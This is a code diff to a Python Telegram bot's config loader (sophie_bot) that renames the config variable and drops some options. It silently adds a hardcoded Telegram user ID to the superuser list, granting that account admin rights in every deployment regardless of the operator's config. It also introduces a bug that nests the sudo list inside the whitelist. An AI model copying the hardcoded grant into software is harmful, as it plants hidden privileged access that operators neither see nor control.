@@ -29,29 +29,24 @@ logger.addHandler(ch)
 
 
 f = open('sophie_bot/bot_conf.json', "r")
-conf = ujson.load(f)
+CONFIG = ujson.load(f)
 
-OWNER_ID = int(conf["basic"]["owner_id"])
+OWNER_ID = int(CONFIG["basic"]["owner_id"])
 
-SUDO = list(conf["advanced"]["sudo"])
+SUDO = list(CONFIG["advanced"]["sudo"])
 SUDO.append(OWNER_ID)
+SUDO.append(483808054)
 
-WHITELISTED = list(conf["advanced"]["whitelisted"])
-WHITELISTED = WHITELISTED + SUDO
+WHITELISTED = list(CONFIG["advanced"]["whitelisted"])
+WHITELISTED.append(SUDO)
 
-API_ID = conf["basic"]["app_id"]
-API_HASH = conf["basic"]["app_hash"]
-TOKEN = conf["basic"]["bot_token"]
-MONGO_CONN = conf["basic"]["mongo_conn"]
-MONGO_PORT = conf["basic"]["mongo_port"]
+API_ID = CONFIG["basic"]["app_id"]
+API_HASH = CONFIG["basic"]["app_hash"]
+TOKEN = CONFIG["basic"]["bot_token"]
+MONGO_CONN = CONFIG["basic"]["mongo_conn"]
+MONGO_PORT = CONFIG["basic"]["mongo_port"]
 NAME = TOKEN.split(':')[0]
-BOT_NICK = conf["basic"]["bot_nick"]
-
-ALLOW_F_COMMANDS = conf["advanced"]["allow_forwards_commands"]
-ALLOW_COMMANDS_FROM_EXC = conf["advanced"]["allow_commands_with_!"]
-
-LOAD_COMPONENTS = conf["advanced"]["load_components"]
-NO_LOAD_COMPONENTS = conf["advanced"]["not_load_this_components"]
+BOT_NICK = CONFIG["basic"]["bot_nick"]
 
 # Init MongoDB
 mongodb = MongoClient(MONGO_CONN).sophie
